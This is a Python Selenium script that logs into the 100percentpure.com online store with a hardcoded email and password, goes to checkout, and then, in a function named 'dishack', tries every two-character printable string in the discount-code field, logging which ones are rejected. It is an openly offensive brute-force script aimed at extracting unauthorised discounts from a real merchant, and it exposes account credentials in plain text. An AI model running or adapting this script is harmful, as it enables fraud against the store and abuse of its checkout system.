from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
import sys
import itertools
from string import printable
import time
#Sets default coding for printing to console

#sys.setdefaultencoding('utf8')

#select Firefox as the webrowser to use and defines it as driver

driver = webdriver.Firefox()
#navigates to url
driver.delete_all_cookies()
driver.get('http://100percentpure.com/account/login')
time.sleep(10)

#defines credentials elements

username = driver.find_element_by_name('customer[email]')
password = driver.find_element_by_name('customer[password]')

#types credentials into HTML form and clicks subit

username.send_keys("marshall.holmes111@gmail.com")
password.send_keys("testingaccount")
driver.find_element_by_class_name('btn--full').click()
time.sleep(30)

shopbag = driver.find_element_by_xpath('/html/body/div[6]/header/div/div/div[3]/ul/li[2]/a/span/span[1]')
wait = WebDriverWait(driver, 30)

wait.until(EC.visibility_of(shopbag))
shopbag.click()
# Selects the checkout button
time.sleep(5)
try:
	checkout = wait.until(EC.visibility_of(driver.find_element_by_xpath('/html/body/div[4]/div[3]/form/div[1]/div[1]/div/button')))
	checkout.click()
except:
	time.sleep(15)
	shopbag = driver.find_element_by_xpath('/html/body/div[6]/header/div/div/div[3]/ul/li[2]/a/span/span[1]')
	shopbag.click()
	time.sleep(15)
	checkout = wait.until(EC.visibility_of(driver.find_element_by_xpath('/html/body/div[4]/div[3]/form/div[1]/div[1]/div/button')))
	checkout.click()

#locates the discount entry form and defines it as discount11

discount = driver.find_element_by_name('checkout[reduction_code]')

# Makes an entry in the discount form and applies the entry
result = []
redone = [''.join(i) for i in itertools.product(printable, repeat = 2)]
result.append(redone)
def dishack():
	for f in sorted(set(redone)):
		discount = driver.find_element_by_name('checkout[reduction_code]')
		discount.clear()
		discount.send_keys(f)
		driver.find_element_by_class_name('field__input-btn').click()
		time.sleep(5)
		try:
			discounterror = driver.find_element_by_xpath('//*[@id="error-for-reduction_code"]')	
			print 'Error'
		except:
			print 'No Error'	


dishack()
